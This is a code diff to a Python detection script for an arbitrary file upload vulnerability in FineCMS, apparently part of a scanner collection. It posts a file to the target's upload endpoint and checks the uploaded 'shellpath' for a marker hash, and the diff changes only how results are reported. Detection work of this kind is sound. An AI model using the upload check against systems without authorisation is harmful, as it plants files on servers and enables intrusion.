@@ -9,8 +9,8 @@ description: FineCMS上传页面无限制,可以上传任意文件。
 import sys
 import random
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class finecms_uploadfile_BaseVerify:
     def __init__(self, url):
@@ -30,12 +30,12 @@ class finecms_uploadfile_BaseVerify:
             req = requests.post(vulnurl, headers=headers, data=post_data, timeout=10, verify=False)
             req2 = requests.get(shellpath, headers=headers, timeout=10, verify=False)
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req2.text:
-                cprint("[+]存在FineCMS任意文件上传漏洞...(高危)\t\tpayload: "+shellpath, "red")
+                return "[+]存在FineCMS任意文件上传漏洞...(高危)\t\tpayload: "+shellpath
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = finecms_uploadfile_BaseVerify(sys.argv[1])
     testVuln.run()
